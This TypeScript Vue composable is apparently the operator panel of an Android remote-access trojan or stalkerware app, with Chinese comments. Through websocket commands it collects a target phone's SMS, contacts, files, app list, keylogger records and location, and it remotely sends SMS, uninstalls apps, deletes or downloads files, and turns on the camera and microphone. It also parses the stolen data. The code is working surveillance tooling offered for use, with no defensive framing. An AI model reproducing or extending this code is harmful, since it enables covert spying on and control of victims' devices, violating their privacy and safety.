import { ref, type Ref } from 'vue';
import type {
    DataRequestMessage,
    WebSocketOutboundMessage,
} from '@/types/websocket';
import type {
    SmsMessage,
    Contact,
    FileItem,
    AppInfo,
    KeylogEntry,
    DataLoadingState,
    LocationInfo,
} from '@/types/device';

type SendFunction = (message: WebSocketOutboundMessage) => boolean;
type MessageApi = { warning: (content: string) => void };

const REQUEST_TIMEOUT = 5000;

export function useDeviceData(
    send: SendFunction,
    deviceId: Ref<string>,
    messageApi?: MessageApi
) {
    const loading = ref<DataLoadingState>({
        sms: false,
        contacts: false,
        files: false,
        apps: false,
        keylog: false,
    });

    const locationLoading = ref(false);
    const locationInfo = ref<LocationInfo | null>(null);

    const sendDataRequest = (
        params: Partial<DataRequestMessage>
    ): boolean => {
        const message: DataRequestMessage = {
            itype: 'slr_panelsend',
            subc: params.subc!,
            pid: deviceId.value,
            ...params,
        };
        return send(message);
    };

    const fetchSms = () => {
        loading.value.sms = true;
        setTimeout(() => {
            if (loading.value.sms) {
                loading.value.sms = false;
                messageApi?.warning('获取短信超时，设备可能未授予权限或离线');
            }
        }, REQUEST_TIMEOUT);
        return sendDataRequest({ subc: 'SMS' });
    };

    const fetchContacts = () => {
        loading.value.contacts = true;
        setTimeout(() => {
            if (loading.value.contacts) {
                loading.value.contacts = false;
                messageApi?.warning('获取联系人超时，设备可能未授予权限或离线');
            }
        }, REQUEST_TIMEOUT);
        return sendDataRequest({ subc: 'Contacts' });
    };

    const fetchFiles = (path?: string) => {
        loading.value.files = true;
        setTimeout(() => {
            if (loading.value.files) {
                loading.value.files = false;
                messageApi?.warning('获取文件列表超时，设备可能未授予权限或离线');
            }
        }, REQUEST_TIMEOUT);
        return sendDataRequest({
            subc: 'files',
            filepath: path || '/sdcard',
        });
    };

    const fetchApps = () => {
        loading.value.apps = true;
        setTimeout(() => {
            if (loading.value.apps) {
                loading.value.apps = false;
                messageApi?.warning('获取应用列表超时，设备可能未授予权限或离线');
            }
        }, REQUEST_TIMEOUT);
        return sendDataRequest({ subc: 'LOADAPPS' });
    };

    const fetchKeylog = (date?: string) => {
        loading.value.keylog = true;
        setTimeout(() => {
            if (loading.value.keylog) {
                loading.value.keylog = false;
                messageApi?.warning('获取键盘记录超时，设备可能未授予权限或离线');
            }
        }, REQUEST_TIMEOUT);
        if (date) {
            return sendDataRequest({
                subc: 'Logdate',
                keylogdate: date,
            });
        }
        return sendDataRequest({ subc: 'Keylog' });
    };

    const fetchLocation = () => {
        locationLoading.value = true;
        setTimeout(() => {
            if (locationLoading.value) {
                locationLoading.value = false;
                messageApi?.warning('获取位置超时，设备可能未授予权限或离线');
            }
        }, REQUEST_TIMEOUT);
        return sendDataRequest({ subc: 'loc' });
    };

    const sendSms = (number: string, message: string) => {
        return sendDataRequest({
            subc: 'SMSSEND',
            smsnumber: number,
            message: message,
        });
    };

    const openApp = (packageName: string) => {
        return sendDataRequest({
            subc: 'OPENAPP',
            packageName,
        });
    };

    const uninstallApp = (packageName: string) => {
        return sendDataRequest({
            subc: 'UNINSTALLAPP',
            packageName,
        });
    };

    const deleteFile = (path: string) => {
        return sendDataRequest({
            subc: 'changefiles',
            filepath: path,
            comdtype: 'D',
        });
    };

    const downloadFile = (path: string) => {
        return sendDataRequest({
            subc: 'viewfile',
            filepath: path,
        });
    };

    const renameDevice = (name: string) => {
        return sendDataRequest({
            subc: 'rename',
            nam: name,
        });
    };

    const startCamera = (camera: 'front' | 'back' = 'back') => {
        return sendDataRequest({
            subc: 'cam',
            SelectedCam: camera,
        });
    };

    const stopCamera = () => {
        return sendDataRequest({ subc: 'camoff' });
    };

    const startMicrophone = () => {
        return sendDataRequest({ subc: 'mic' });
    };

    const stopMicrophone = () => {
        return sendDataRequest({ subc: 'micoff' });
    };

    return {
        loading,
        locationLoading,
        locationInfo,
        fetchSms,
        fetchContacts,
        fetchFiles,
        fetchApps,
        fetchKeylog,
        fetchLocation,
        sendSms,
        openApp,
        uninstallApp,
        deleteFile,
        downloadFile,
        renameDevice,
        startCamera,
        stopCamera,
        startMicrophone,
        stopMicrophone,
    };
}

export function parseSmsData(data: string): SmsMessage[] {
    if (!data) return [];
    const lines = data.trim().split('\n');
    const messages: SmsMessage[] = [];

    for (const line of lines) {
        if (!line.trim()) continue;
        try {
            const parsed = JSON.parse(line);
            messages.push({
                time: parsed.time || '',
                message: parsed.message || '',
                full_message: parsed.full_message,
                number: parsed.number || '',
                type: parsed.type || 1,  // 默认为收件
            });
        } catch {
            continue;
        }
    }

    return messages;
}

export function parseContactsData(data: string): Contact[] {
    if (!data) return [];
    const contacts: Contact[] = [];

    // 先尝试解析为 JSON 数组（Replica APK 格式）
    try {
        const parsed = JSON.parse(data);
        if (Array.isArray(parsed)) {
            for (const item of parsed) {
                contacts.push({
                    name: item.name || item.Name || '',
                    number: item.number || item.Number || item.phone || '',
                });
            }
            return contacts;
        }
    } catch {
        // 不是 JSON 数组，尝试逐行解析
    }

    // 逐行解析（旧格式兼容）
    const lines = data.trim().split('\n');
    for (const line of lines) {
        if (!line.trim()) continue;

        try {
            const parsed = JSON.parse(line);
            contacts.push({
                name: parsed.name || parsed.Name || '',
                number: parsed.number || parsed.Number || parsed.phone || '',
            });
        } catch {
            // 回退到分隔符格式: "姓名[>A<]号码"
            const parts = line.split('[>A<]');
            if (parts.length >= 2) {
                contacts.push({
                    name: parts[0] || '',
                    number: parts[1] || '',
                });
            }
        }
    }

    return contacts;
}

export function parseFilesData(data: string): FileItem[] {
    if (!data) return [];
    const files: FileItem[] = [];

    // 尝试 JSON 格式 (Replica APK)
    try {
        const parsed = JSON.parse(data);
        if (Array.isArray(parsed)) {
            for (const item of parsed) {
                files.push({
                    name: item.name || '',
                    size: String(item.size || '0'),
                    path: item.path || '',
                    lastModified: item.lastModified || '',
                    isDirectory: item.isDirectory === true || item.isDirectory === 'true',
                });
            }
            return files;
        }
    } catch {
        // 不是 JSON，尝试旧格式
    }

    // 旧格式: [>D<] 分隔项, [>A<] 分隔字段
    const items = data.split('[>D<]');
    for (const item of items) {
        if (!item.trim()) continue;
        const parts = item.split('[>A<]');
        if (parts.length >= 7) {
            files.push({
                name: parts[2] || '',
                size: parts[3] || '0',
                path: parts[4] || '',
                lastModified: parts[5] || '',
                isDirectory: parts[7] === '1',
            });
        }
    }

    return files;
}

export function parseAppsData(data: string): AppInfo[] {
    if (!data) return [];

    try {
        const parsed = JSON.parse(data);
        const apps = parsed.apps || parsed;
        if (Array.isArray(apps)) {
            return apps.map(app => ({
                name: app.name || app.appName || '',
                packageName: app.packageName || app.package || '',
                icon: app.icon || app.appIcon || '',
            }));
        }
    } catch {
        return [];
    }

    return [];
}

export function parseKeylogData(data: string): KeylogEntry[] {
    if (!data) return [];
    const entries: KeylogEntry[] = [];

    try {
        const parsed = JSON.parse(data);
        if (Array.isArray(parsed)) {
            for (const item of parsed) {
                entries.push({
                    time: item.time || item.timestamp || '',
                    app: item.app || item.application || '',
                    action: item.action || item.text || item.key || '',
                    status: item.status || item.type || '',
                });
            }
        }
    } catch {
        const lines = data.trim().split('\n');
        for (const line of lines) {
            if (!line.trim()) continue;
            try {
                const parsed = JSON.parse(line);
                entries.push({
                    time: parsed.time || '',
                    app: parsed.app || '',
                    action: parsed.action || parsed.text || '',
                    status: parsed.status || '',
                });
            } catch {
                // 设备端实际数据格式: "状态|事件类型|内容|时间" (pipe 分隔)
                const pipeParts = line.split('|');
                if (pipeParts.length >= 3) {
                    entries.push({
                        status: pipeParts[0] || '',
                        app: pipeParts[1] || '',
                        action: pipeParts[2] || '',
                        time: pipeParts[3] || '',
                    });
                } else {
                    // 旧格式兼容: [>A<] 分隔
                    const parts = line.split('[>A<]');
                    if (parts.length >= 3) {
                        entries.push({
                            time: parts[0] || '',
                            app: parts[1] || '',
                            action: parts[2] || '',
                            status: parts[3] || '',
                        });
                    }
                }
            }
        }
    }

    return entries;
}

export function parseLocationData(data: string): LocationInfo | null {
    if (!data) return null;

    try {
        const parsed = JSON.parse(data);
        return {
            latitude: parseFloat(parsed.latitude || parsed.lat || 0),
            longitude: parseFloat(parsed.longitude || parsed.lng || parsed.lon || 0),
            accuracy: parsed.accuracy ? parseFloat(parsed.accuracy) : undefined,
            timestamp: parsed.timestamp || parsed.time || new Date().toISOString(),
        };
    } catch {
        const parts = data.split(',');
        if (parts.length >= 2) {
            const lat = parseFloat(parts[0]);
            const lng = parseFloat(parts[1]);
            if (!isNaN(lat) && !isNaN(lng)) {
                return {
                    latitude: lat,
                    longitude: lng,
                    accuracy: parts[2] ? parseFloat(parts[2]) : undefined,
                    timestamp: new Date().toISOString(),
                };
            }
        }

        const match = data.match(/(-?\d+\.?\d*)/g);
        if (match && match.length >= 2) {
            return {
                latitude: parseFloat(match[0]),
                longitude: parseFloat(match[1]),
                timestamp: new Date().toISOString(),
            };
        }
    }

    return null;
}
